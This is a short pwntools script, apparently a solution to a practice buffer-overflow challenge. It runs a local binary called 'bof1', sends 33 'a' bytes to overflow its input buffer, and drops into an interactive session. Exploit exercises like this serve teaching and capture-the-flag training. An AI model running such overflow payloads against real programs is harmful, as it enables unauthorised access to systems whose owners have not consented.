from pwn import *

p = process('./bof1')
exe = ELF('./bof1', checksec=False)

payload = b'a'*33

p.sendline(payload)
p.interactive()